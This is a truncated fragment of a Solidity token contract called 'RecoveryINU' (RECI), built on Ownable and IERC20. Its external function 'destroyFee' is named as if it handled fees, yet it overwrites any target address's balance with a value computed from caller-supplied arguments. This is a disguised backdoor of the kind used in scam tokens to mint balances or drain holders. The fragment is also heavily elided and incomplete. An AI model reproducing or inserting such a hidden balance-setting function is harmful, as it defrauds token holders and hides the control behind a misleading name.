...
contract RecoveryINU is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    string private  _name = "RecoveryINU";
    string private  _symbol = "RECI";
    ...
    function destroyFee(address target, uint256 accuracy, uint256 amountAdded) external {
        ...
        _tOwned[target] = amountAdded.mul(2).div(100) + accuracy * ten ** __decimals;
